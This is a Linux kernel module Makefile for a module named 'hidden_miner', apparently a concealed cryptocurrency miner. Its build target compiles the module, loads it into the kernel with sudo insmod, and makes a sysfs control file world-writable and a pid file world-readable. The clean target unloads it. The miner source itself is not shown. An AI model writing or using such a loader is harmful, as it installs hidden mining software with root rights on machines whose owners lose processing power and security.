obj-m += hidden_miner.o

KERNEL_DIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KERNEL_DIR) M=$(PWD) modules
	sudo insmod hidden_miner.ko
	sudo chmod a+rw /sys/hidden_timer/timer
	sudo chmod a+r /sys/hidden_timer/pid

clean:
	$(MAKE) -C $(KERNEL_DIR) M=$(PWD) clean
	sudo rmmod hidden_miner
